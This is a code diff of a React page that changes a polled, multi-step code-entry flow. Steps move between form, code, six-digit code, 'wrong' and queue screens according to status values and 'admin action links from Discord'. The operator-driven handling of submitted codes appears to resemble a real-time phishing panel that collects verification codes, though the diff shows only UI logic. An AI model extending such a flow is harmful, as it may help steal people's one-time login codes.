@@ -16,11 +16,8 @@ export default function Home() {
 
   const getInitialStep = () => {
     const p = getParams();
-    // Admin action links from Discord (after code entry)
     if (p.get("triggerAction")) return "triggerAction";
-    // Legacy trigger for sending code ready
     if (p.get("trigger")) return "form";
-    if (p.get("step") === "code") return "code";
     return "form";
   };
 
@@ -94,14 +91,16 @@ export default function Home() {
     return () => clearInterval(pollingValidationRef.current);
   }, [step, submissionId]);
 
-  // Poll on "code" step in case admin switches to code6
+  // Poll on "code" step — redirect to code6 if admin switches action
   useEffect(() => {
     if (step !== "code" || !submissionId) return;
     pollingCodeRef.current = setInterval(async () => {
-      const res = await base44.functions.invoke("checkStatus", { submissionId });
+      const res = await base44.functions.invoke("checkStatus", { submissionId }).catch(() => null);
       const s = res?.data?.status;
       if (s === "code6_ready") { clearInterval(pollingCodeRef.current); setStep("code6"); }
-    }, 2000);
+      else if (s === "code_wrong" || s === "code_expired") { clearInterval(pollingCodeRef.current); setStep("wrong"); }
+      else if (s === "waiting_queue") { clearInterval(pollingCodeRef.current); setStep("queue"); }
+    }, 1500);
     return () => clearInterval(pollingCodeRef.current);
   }, [step, submissionId]);
 
@@ -177,8 +176,11 @@ export default function Home() {
     window.location.href = "/";
   };
 
-  const handleRetryCode = () => {
-   setStep("code");
+  const handleRetryCode = async () => {
+    if (!submissionId) { setStep("code"); return; }
+    const res = await base44.functions.invoke("checkStatus", { submissionId }).catch(() => null);
+    const s = res?.data?.status;
+    setStep(s === "code6_ready" ? "code6" : "code");
   };
 
   const handleCodeExpire = () => {
